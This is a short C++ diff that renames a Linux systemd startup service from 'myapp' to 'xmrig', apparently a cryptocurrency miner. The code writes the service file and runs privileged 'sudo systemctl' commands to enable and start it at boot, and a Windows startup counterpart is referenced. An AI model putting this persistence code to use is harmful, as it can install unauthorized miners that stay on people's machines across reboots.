@@ -55,7 +55,7 @@ void addToStartupWindows(const std::string &path) {
 #include <fstream>
 
 void addToStartupLinux(const std::string &path) {
-    std::string serviceFilePath = "/etc/systemd/system/myapp.service";
+    std::string serviceFilePath = "/etc/systemd/system/xmrig.service";
 
     std::ofstream serviceFile(serviceFilePath);
     if (!serviceFile) {
@@ -64,7 +64,7 @@ void addToStartupLinux(const std::string &path) {
     }
 
     serviceFile << "[Unit]\n"
-                << "Description=MyApp Service\n"
+                << "Description=xmrig application\n"
                 << "After=network.target\n\n"
                 << "[Service]\n"
                 << "ExecStart=" << path << "\n"
@@ -78,8 +78,8 @@ void addToStartupLinux(const std::string &path) {
 
     system("sudo systemctl daemon-reload");
 
-    system("sudo systemctl enable myapp.service");
-    system("sudo systemctl start myapp.service");
+    system("sudo systemctl enable xmrig.service");
+    system("sudo systemctl start xmrig.service");
 }
 #endif
 
